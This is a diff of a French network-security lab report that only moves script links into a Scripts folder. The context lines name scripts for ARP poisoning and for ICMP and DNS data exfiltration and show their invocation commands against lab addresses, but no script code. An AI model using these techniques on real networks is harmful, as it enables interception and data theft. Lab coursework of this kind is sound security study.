@@ -12,7 +12,7 @@
 
 🌞 **`ping.py`**
 
-[Script](./ping.py)
+[Script](./Scripts/ping.py)
 
 ```sh
 $ sudo python3 ping.py
@@ -26,7 +26,7 @@ Answers :
 
 🌞 **`tcp_cap.py`**
 
-[Script](./tcp_cap.py)
+[Script](./Scripts/tcp_cap.py)
 
 ```bash
 $ sudo python3 tcp_cap.py
@@ -39,7 +39,7 @@ TCP SYN ACK reçu !
 
 🌞 **`dns_cap.py`**
 
-[Script](./dsn_cap.py)
+[Script](./Scripts/dsn_cap.py)
 
 ```bash
 $ dig ynov.com
@@ -75,7 +75,7 @@ $ sudo python3 dns_cap.py
 
 🌞 **`dns_lookup.py`**
 
-[Script](./dns_lookup.py)
+[Script](./Scripts/dns_lookup.py)
 
 ```bash
 $ sudo python3 dns_lookup.py
@@ -86,7 +86,7 @@ $ sudo python3 dns_lookup.py
 
 🌞 **`arp_poisoning.py`**
 
-[Script](./arp_poisoning.py)
+[Script](./Scripts/arp_poisoning.py)
 
 Depuis la cible :
 
@@ -116,7 +116,7 @@ $ ip n s | grep 10.13.33.37
 
 🌞 **`icmp_exf_send.py`**
 
-[Script](./icmp_exf_send.py)
+[Script](./Scripts/icmp_exf_send.py)
 
 ```bash
 $ sudo python3 icmp_exf_send.py 192.168.56.1 t
@@ -131,7 +131,7 @@ Contenu du ping en ascii :
 
 🌞 **`icmp_exf_receive.py`**
 
-[Script](./icmp_exf_send.py)
+[Script](./Scripts/icmp_exf_send.py)
 
 ```bash
 $ sudo python3 icmp_exf_send.py 192.168.56.5 t
@@ -148,7 +148,7 @@ t
 
 🌞 **`dns_exfiltration_send.py`**
 
-[Script](./dns_exfiltration_send.py)
+[Script](./Scripts/dns_exfiltration_send.py)
 
 ```bash
 $ sudo python3 dns_exfiltration_send.py 192.168.56.1 testing_this_test_to_test_my_test_oki
